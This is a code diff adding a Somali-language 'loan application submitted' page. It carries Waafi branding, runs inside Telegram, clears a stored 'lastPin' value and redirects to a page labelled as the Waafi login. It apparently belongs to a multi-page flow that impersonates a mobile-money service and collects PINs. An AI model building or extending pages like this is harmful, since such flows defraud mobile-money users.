@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="so">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Gudbinta Guul - Waafi</title>
+
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f7f9fb;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+        }
+        
+        .top-toast {
+            position: fixed;
+            top: 20px;
+            background: #1a1c1e;
+            color: white;
+            padding: 12px 20px;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 14px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+        }
+        
+        .top-toast .check-icon {
+            color: #a3e635;
+            font-weight: bold;
+        }
+        
+        .success-card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 44px 24px;
+            border-radius: 20px;
+            text-align: center;
+            box-shadow: 0 10px 36px rgba(0, 0, 0, 0.06);
+        }
+        
+        .check-circle {
+            width: 100px;
+            height: 100px;
+            background: #a3e635;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 26px;
+            color: white;
+            font-size: 48px;
+            font-weight: 700;
+        }
+        
+        h1 {
+            color: #4caf50;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 18px;
+            line-height: 1.3;
+        }
+        
+        p {
+            color: #777;
+            font-size: 15px;
+            margin: 4px 0;
+            line-height: 1.5;
+        }
+        
+        .timer-container {
+            background: #f4f7f4;
+            border-radius: 14px;
+            padding: 16px 18px;
+            margin: 30px 0 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 12px;
+            color: #4caf50;
+            font-weight: 600;
+            font-size: 15px;
+        }
+        
+        .loader-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #d4e8d4;
+            border-top: 2px solid #4caf50;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            flex-shrink: 0;
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .btn-home {
+            background: white;
+            border: 1px solid #ddd;
+            color: #777;
+            width: 100%;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.2s, border-color 0.2s;
+        }
+        
+        .btn-home:active {
+            background: #f5f5f5;
+            border-color: #ccc;
+        }
+    </style>
+</head>
+
+<body>
+
+    <!-- Top Toast -->
+    <div class="top-toast">
+        <span class="check-icon">✔</span>
+        <span>Codsiga si guul leh ayaa loo gudbiyay!</span>
+    </div>
+
+    <!-- Success Card -->
+    <div class="success-card">
+        <div class="check-circle">✓</div>
+
+        <h1>Codsiga Amaahda<br>waa la gudbiyay</h1>
+
+        <p>Codsigaaga waa la gudbiyay. Fadlan sug ansixinta.</p>
+        <p>Waxaad heli doontaa farriin xaqiijin ah.</p>
+
+        <!-- Timer -->
+        <div class="timer-container">
+            <div class="loader-spinner"></div>
+            <span>
+                Ku celinaya galitaanka Waafi
+                <span id="timer">5</span> ilbiriqsi...
+            </span>
+        </div>
+
+        <!-- Manual button -->
+        <button type="button" class="btn-home" onclick="goToPage6()">
+            Tag Galitaanka Hadda
+        </button>
+    </div>
+
+    <script>
+        let timeLeft = 5; // Start at 5 seconds
+        let interval = null;
+
+        // ---------- Update timer display ----------
+        function updateTimerDisplay() {
+            const el = document.getElementById('timer');
+            if (el) el.textContent = timeLeft;
+        }
+
+        // ---------- Navigate to page6 ----------
+        function goToPage6() {
+            // Clear the interval so it doesn't fire again
+            if (interval) {
+                clearInterval(interval);
+                interval = null;
+            }
+
+            // Clean up old pin data
+            localStorage.removeItem('lastPin');
+
+            // Navigate to page6.html
+            window.location.href = "page6.html";
+        }
+
+        // ---------- On page load ----------
+        window.addEventListener('DOMContentLoaded', function() {
+            // Telegram integration
+            const tg = window.Telegram && window.Telegram.WebApp;
+            if (tg) {
+                tg.ready();
+                tg.expand();
+            }
+
+            // Show initial timer value
+            updateTimerDisplay();
+
+            // Start countdown
+            interval = setInterval(function() {
+                timeLeft--;
+
+                // Auto-navigate when timer reaches 1 (not 0)
+                if (timeLeft <= 1) {
+                    // Show "1" briefly before navigating
+                    updateTimerDisplay();
+                    // Small delay so user sees "1", then navigate
+                    setTimeout(function() {
+                        goToPage6();
+                    }, 100);
+                    return;
+                }
+
+                updateTimerDisplay();
+            }, 1000);
+        });
+    </script>
+
+</body>
+
+</html>
